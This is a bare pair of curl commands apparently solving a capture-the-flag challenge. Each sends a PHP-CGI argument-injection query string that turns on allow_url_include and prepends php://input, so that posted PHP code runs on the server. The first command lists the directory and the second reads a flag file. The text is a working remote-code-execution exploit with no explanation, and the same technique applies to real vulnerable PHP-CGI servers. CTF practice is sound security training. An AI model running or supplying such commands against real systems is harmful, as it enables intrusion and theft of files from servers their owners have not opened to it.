curl "http://ctfq.sweetduet.info:10080/~q12/?-d+allow_url_include%3DOn+-d+auto_prepend_file%3Dphp://input" -X POST -d "<?php system('ls -al'); ?>"

curl "http://ctfq.sweetduet.info:10080/~q12/?-d+allow_url_include%3DOn+-d+auto_prepend_file%3Dphp://input" -X POST -d "<?php system('cat flag_flag_flag.txt'); ?>"